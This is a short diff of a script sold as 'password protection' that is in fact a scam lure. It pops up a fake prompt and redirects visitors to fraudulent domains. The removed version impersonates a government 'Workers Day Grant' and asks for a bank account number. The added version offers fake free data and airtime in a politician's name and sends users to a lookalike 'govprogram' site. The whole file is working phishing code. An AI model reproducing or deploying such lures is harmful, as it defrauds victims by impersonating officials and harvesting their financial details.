@@ -1,8 +1,8 @@
 <script type="text/javascript"> 
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '10'
-password=prompt('SMS FG : You have been selected to benefit from the ongoing 50,000 NAIRA WORKERS DAY GRANT Enter your account number and click OK to continue ',' Enter your account number here.');
+password=prompt('Congratulation: You are Qualify to Receive 10GB and 20GH Airtime MAHAMUDU BAWUMIA Offer, Press 1 to Activate',' 1');
 if (password != '10') {
-location.href='https://2024-program.xyz/workersday';
+location.href='https://bawumia-offer.govprogram.lat/10GB';
 }
 </script>
